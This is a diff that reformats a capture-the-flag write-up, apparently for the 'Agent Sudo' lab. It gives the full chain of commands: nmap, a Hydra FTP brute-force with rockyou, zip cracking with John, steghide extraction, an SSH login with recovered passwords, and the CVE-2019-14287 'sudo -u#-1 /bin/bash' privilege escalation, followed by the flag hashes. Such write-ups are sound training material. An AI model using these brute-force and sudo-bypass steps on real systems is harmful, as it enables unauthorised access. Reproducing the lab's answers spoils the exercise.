@@ -1,67 +1,160 @@
-# Agent Sudo
 
-# first we do scan with nmap we fournd
-- 21 ftp
-- 22 ssh
-- 80 tcp
+# Agent Sudo — Writeup
 
-# second we use burpsute to change agent name until 
-Agent C
-his name is chris
+## Reconnaissance
 
-# third we do brute force on ftp server to get password of chris using hydra
-the password is ==> crystal
+### Nmap Scan  
+We started with an `nmap` scan and discovered the following open ports:
 
-# we sgin in ftp server and found 
-To_agentJ.txt
-cute-alien.jpg
+| Port | Service |
+|-------|---------|
+| 21    | FTP     |
+| 22    | SSH     |
+| 80    | HTTP    |
+
+---
+
+## Web Enumeration
+
+- We explored the web server (port 80) and used **Burp Suite** to modify the `User-Agent` header.
+- After trying different agents, **Agent C** revealed the username:  
+  ```
+  Agent C's name is: chris
+  ```
+
+---
+
+## FTP Brute-force
+
+- We performed an FTP brute-force attack using **Hydra**:
+  ```bash
+  hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.130.39
+  ```
+- Found credentials:
+  ```
+  chris:crystal
+  ```
+
+---
+
+## FTP Loot
+
+Logged into FTP and found:
+```
+To_agentJ.txt  
+cute-alien.jpg  
 cutie.png
-= and we get them to our device
+```
+We downloaded all the files for analysis.
 
-the massage in to_agent.txt told us there is password in photos 
+---
 
-# we use binwalk on cutie.png 
-wefoud
-hidden dir:
+## File Analysis
+
+### To_agentJ.txt  
+- The note mentioned that a password was hidden in one of the images.
+
+### cutie.png  
+- Ran `binwalk`:
+  ```bash
+  binwalk cutie.png
+  ```
+- Found embedded files:
+  ```
   365
   365.zlib
   8702.zip
   To_agentR.txt
+  ```
 
-# and we use john to crack password of zip fiel
-=> zip2john 8702.zip > new.txt
+### Crack 8702.zip  
+- Extracted hash for **John the Ripper**:
+  ```bash
+  zip2john 8702.zip > new.txt
+  john new.txt
+  ```
+- Password found:
+  ```
+  alien
+  ```
 
-=> john new.txt 
+- Extracted zip:
+  ```bash
+  7z e 8702.zip
+  ```
+- Found:
+  ```
+  To_agentR.txt
+  ```
+- The note revealed a steghide passphrase:
+  ```
+  steg password: Area51
+  ```
 
-=== found password : alien 
+---
 
-# and use 7z tool 
+## Steganography
 
-=> 7z e 8702.zip
-and enter the password : alien 
+- Extracted data from `cute-alien.jpg`:
+  ```bash
+  steghide extract -sf cute-alien.jpg
+  ```
+- Found `message.txt`:
+  ```
+  The message is to James.
+  His login password is: hackerrules!
+  ```
 
-and after that we cat To_agentR.txt
+---
 
-and wefound steg password: Area51
+## SSH Access
 
-# then use steghide -extract -sf cute-alien.jpg
-and we foud "message.txt"
-the message is to 
-  james
-and it says his login password is ``hackerrules!``
+- Logged in via SSH:
+  ```bash
+  ssh james@10.10.130.39
+  ```
+- Found `user.txt`:
+  ```
+  b03d975e8c92a7c04146cfa7a5a313c7
+  ```
 
-# now we connect to ssh using james@10.10.130.39
-and we found userflag.txt: b03d975e8c92a7c04146cfa7a5a313c7
+- Noticed `Alien_autospy.jpg`, searched online and found:
+  ```
+  Roswell
+  ```
 
-and found image Alien_autospy.jpg 
-i did search on it on google photos and found that is Roswell
-# now i need to do previllage esclation 
-== ``sudo -l``
-i found :
-           (ALL, !root) /bin/bash
-i search for it on exploit DB i found :
-         CVE-2019-14287
-         sudo -u#-1 /bin/bash  == i run this command and i became root ==
-and i found root flag in /root
-     flag : b53a02f55b57d4439e3341834d70c062
-and the name of agent R was in the same file it was DesKel
+---
+
+## Privilege Escalation
+
+- Checked `sudo -l`:
+  ```
+  (ALL, !root) /bin/bash
+  ```
+
+- Identified vulnerability: **CVE-2019-14287**
+
+- Exploited with:
+  ```bash
+  sudo -u#-1 /bin/bash
+  ```
+- Got root shell.
+
+- Found `root.txt`:
+  ```
+  b53a02f55b57d4439e3341834d70c062
+  ```
+
+- Agent R’s name:
+  ```
+  DesKel
+  ```
+
+---
+
+## Summary of Flags
+
+| Flag Type | Hash |
+|------------|----------------------------------|
+| User Flag  | `b03d975e8c92a7c04146cfa7a5a313c7` |
+| Root Flag  | `b53a02f55b57d4439e3341834d70c062` |
